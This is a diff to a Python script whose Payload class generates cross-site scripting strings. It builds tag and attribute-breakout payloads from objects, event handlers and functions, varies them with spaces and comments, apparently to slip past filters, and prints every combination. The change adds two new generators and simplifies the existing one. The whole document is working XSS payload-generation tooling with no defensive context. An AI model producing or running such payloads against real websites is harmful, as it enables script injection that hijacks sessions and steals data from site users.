@@ -13,8 +13,7 @@ class Payload:
         self.src = 'src=1'
         self.src2 = 'src="1"'
         self.space = ' '
-        self.message = '(1)'
-        self.message2 = '`1`'
+        self.message = '``'
 
     def addspace(self, value):
         return value + self.space
@@ -22,58 +21,106 @@ class Payload:
     def addcomment(self, value):
         return value + self.comment
 
+    def combine3(self):
+        for i in range(0, 2):
+            for j in range(0, self.functions.__len__()):
+                payload = '''
+'''
+                if i is 0:
+                    payload = self.addspace(payload)
+                if i is 1:
+                    payload = self.addcomment(payload)
+                payload += self.functions[j]
+                if i is 0:
+                    payload = self.addspace(payload)
+                if i is 1:
+                    payload = self.addcomment(payload)
+                payload += self.message
+                if self.space not in payload:
+                    self.payloads3.append(payload)
+                if self.comment not in payload:
+                    self.payloads3.append(payload)
+
+    def combine2(self):
+        for i in range(0, 2):
+            for j in range(0, self.events.__len__()):
+                for k in range(0, self.functions.__len__()):
+                    payload = '"'
+                    if i is 0:
+                        payload = self.addspace(payload)
+                    if i is 1:
+                        payload = self.addcomment(payload)
+                    payload += self.events[j]
+                    if i is 0:
+                        payload = self.addspace(payload)
+                    if i is 1:
+                        pass
+                    payload += '='
+                    if i is 0:
+                        payload = self.addspace(payload)
+                    if i is 1:
+                        payload = self.addcomment(payload)
+                    payload += self.functions[k]
+                    if i is 0:
+                        pass
+                    if i is 1:
+                        payload = self.addcomment(payload)
+                    payload += self.message
+                    if self.space not in payload:
+                        self.payloads2.append(payload)
+                    if self.comment not in payload:
+                        self.payloads2.append(payload)
+
     def combine1(self):
         for i in range(0, 2):
             for j in range(0, 2):
-                for k in range(0, 2):
-                    for l in range(0, 3):
-                        for m in range(0, 2):
-                            for n in range(0, self.events.__len__()):
-                                for o in range(0, self.functions.__len__()):
-                                    for p in range(0, 2):
-                                        payload = '<' + self.object
-                                        if i is 0:
-                                            payload = self.addspace(payload)
-                                        if i is 1:
-                                            payload = self.addcomment(payload)
-                                        if j is 0:
-                                            payload += self.src
-                                        if j is 1:
-                                            payload += self.src2
-                                        if j is 0:
-                                            payload = self.addspace(payload)
-                                        if j is 1:
-                                            pass
-                                        payload += self.events[n]
-                                        if k is 0:
-                                            pass
-                                        if k is 1:
-                                            payload = self.addspace(payload)
-                                        payload += '='
-                                        if l is 0:
-                                            payload = self.addspace(payload)
-                                        if l is 1:
-                                            payload = self.addcomment(payload)
-                                        if l is 2:
-                                            pass
-                                        payload += self.functions[o]
-                                        if m is 0:
-                                            pass
-                                        if m is 1:
-                                            payload = self.addcomment(payload)
-                                        if p is 0:
-                                            payload += self.message
-                                        if p is 1:
-                                            payload += self.message2
-                                        payload += '>'
-                                        self.payloads1.append(payload)
+                for k in range(0, self.events.__len__()):
+                    for l in range(0, self.functions.__len__()):
+                        payload = '<'
+                        payload += self.object
+                        if i is 0:
+                            payload = self.addspace(payload)
+                        if i is 1:
+                            payload = self.addcomment(payload)
+                        if j is 0:
+                            payload += self.src
+                        if j is 1:
+                            payload += self.src2
+                        if j is 0:
+                            payload = self.addspace(payload)
+                        if j is 1:
+                            payload = self.addcomment(payload)
+                        payload += self.events[k]
+                        if i is 0:
+                            payload = self.addspace(payload)
+                        if i is 1:
+                            pass
+                        payload += '='
+                        if i is 0:
+                            payload = self.addspace(payload)
+                        if i is 1:
+                            payload = self.addcomment(payload)
+                        payload += self.functions[l]
+                        if i is 0:
+                            pass
+                        if i is 1:
+                            payload = self.addcomment(payload)
+                        payload += self.message
+                        payload += '>'
+                        if self.space not in payload:
+                            self.payloads1.append(payload)
+                        if self.comment not in payload:
+                            self.payloads1.append(payload)
 
 pay = Payload()
 pay.combine1()
+pay.combine2()
+pay.combine3()
 for item in pay.payloads1:
     print item
-
-
-
+for item in pay.payloads2:
+    print item
+for item in pay.payloads3:
+    print item
 
 
